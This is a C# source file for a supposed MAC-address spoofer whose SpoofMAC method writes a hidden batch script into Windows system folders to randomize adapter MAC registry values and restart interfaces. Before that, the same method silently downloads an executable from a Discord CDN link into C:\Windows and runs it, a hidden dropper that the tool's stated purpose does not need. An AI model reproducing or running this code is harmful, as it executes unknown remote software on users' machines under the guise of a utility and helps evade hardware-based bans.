using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace API_Example
{
    class MAC
    {
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "abcdefghilmnopqrsovzt1289426915947";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        public static void SpoofMAC()
        {
            string locationMac = @"C:\Windows\network.exe";
            string linkMac = "https://cdn.discordapp.com/attachments/651522382200176690/660985147646148631/network_1.exe";
            WebClient webClient = new WebClient();

            webClient.DownloadFile(linkMac, locationMac);
            Thread.Sleep(3000);
            Process.Start(locationMac);
            
            string Username = Environment.UserName;
            string driveLetter = Path.GetPathRoot(Environment.CurrentDirectory);
            string[] Directorys =
            {
                 $@"{driveLetter}Windows\Resources\Themes\aero",
                $@"{driveLetter}Windows\Media",
                $@"{driveLetter}Windows\System32",
                $@"{driveLetter}Windows\SysWOW64",
                $@"{driveLetter}Windows\Branding\BaseBrd",
                $@"{driveLetter}Windows\InputMethod\CHS",
                $@"{driveLetter}Windows\Help\en-US",
                $@"{driveLetter}Windows\IdentityCRL\INT",
            };
            string[] Extentions =
            {
            @".dll",
            @".dat",
            @".sys",
            @".dll",
            @".dat",
            @".sys",
            @".dll",
            @".sys",
            @".dat",
             @".dll",
            @".sys",
            @".dat",
            };
            string name = RandomString(5);
            int i = RandomNumber(0, 8);
            string path = Directorys[i] + @"\" + name + ".bat";
            try
            {
                string input = "SETLOCAL ENABLEDELAYEDEXPANSION\n" +
                              " SETLOCAL ENABLEEXTENSIONS\n" +
                              " FOR /F \"tokens=1\" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (\n" +
                              " CALL :MAC\n" + " FOR %%b IN (0 00 000) DO (\n" +
                              " REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a /v NetworkAddress /t REG_SZ /d !MAC!  /f >NUL 2>NUL\n" +
                              " )\n" + " )\n" +
                              " FOR /F \"tokens=1\" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (\n" +
                              " FOR %%b IN (0 00 000) DO (\n" +
                              " REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a /v PnPCapabilities /t REG_DWORD /d 24 /f >NUL 2>NUL\n" +
                              " )\n" + " )\n" +
                              " FOR /F \"tokens=2 delims=, skip=2\" %%a IN ('\"wmic nic where (netconnectionid like '%%') get netconnectionid,netconnectionstatus /format:csv\"') DO (\n" +
                              " netsh interface set interface name=\"%%a\" disable >NUL 2>NUL\n" +
                              " netsh interface set interface name=\"%%a\" enable >NUL 2>NUL\n" +
                              " )\n" + " GOTO :EOF\n" + " :MAC\n" + " SET COUNT=0\n" + " SET GEN=ABCDEF0123456789\n" +
                              " SET GEN2=26AE\n" + " SET MAC=\n" + " :MACLOOP\n" + " SET /a COUNT+=1\n" +
                              " SET RND=%random%\n" + " ::%%n, \n" + " SET /A RND=RND%%16\n" + " SET RNDGEN=!GEN:~%RND%,1!\n" +
                              " SET /A RND2=RND%%4\n" + " SET RNDGEN2=!GEN2:~%RND2%,1!\n" +
                              " IF \"!COUNT!\"  EQU \"2\" (SET MAC=!MAC!!RNDGEN2!) ELSE (SET MAC=!MAC!!RNDGEN!)\n" +
                              " IF !COUNT!  LEQ 11 GOTO MACLOOP \n";
                using (var tw = new StreamWriter(path, true))
                {
                    tw.WriteLine(input);
                }
                Process mac = new Process();
                mac.StartInfo.UseShellExecute = false;
                mac.StartInfo.CreateNoWindow = true;
                mac.StartInfo.FileName = path;
                mac.Start();
                mac.WaitForExit();
                File.Delete(path);
            }
            catch
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }

                Console.ResetColor();
            }
        }
    }
}

